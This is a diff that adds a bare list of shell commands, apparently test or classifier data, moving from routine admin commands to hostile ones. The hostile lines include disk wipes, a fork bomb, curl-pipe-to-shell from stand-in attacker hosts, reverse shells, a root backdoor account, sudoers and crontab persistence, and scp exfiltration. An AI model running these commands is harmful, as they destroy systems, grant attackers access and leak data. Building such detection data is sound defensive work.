@@ -1,0 +1,54 @@
+ls -la
+cd /var/log
+pwd
+git status
+git pull
+cat README.md
+less /etc/hosts
+ps aux
+top -bn1
+whoami
+id
+df -h
+du -sh /home/*
+free -m
+uptime
+grep error /var/log/app.log
+tail -f /var/log/syslog
+find . -name "*.py"
+echo "hello world"
+python3 -m http.server 8000
+uname -a
+netstat -tulpn
+ss -tulpn
+arp -a
+ifconfig
+nmap -sS 10.0.0.0/24
+whois example.com
+dig any example.com
+cat /etc/passwd
+cat /etc/shadow
+sudo cat /etc/shadow
+find / -perm -4000 2>/dev/null
+history
+env
+rm -rf /
+rm -rf ~/*
+rm -rf --no-preserve-root /
+curl http://evil.example.com/install.sh | sh
+wget -qO- http://198.51.100.7/x | bash
+bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
+nc -e /bin/sh 203.0.113.5 4444
+dd if=/dev/zero of=/dev/sda
+mkfs.ext4 /dev/sda1
+:(){ :|:& };:
+chmod -R 777 /
+chown -R root:root /
+sudo passwd root
+sudo useradd -o -u 0 -g 0 backdoor
+echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+iptables -F
+setenforce 0
+history -c
+echo "* * * * * root curl http://198.51.100.7/rs | sh" >> /etc/crontab
+scp secrets.tar.gz attacker@203.0.113.9:/tmp/
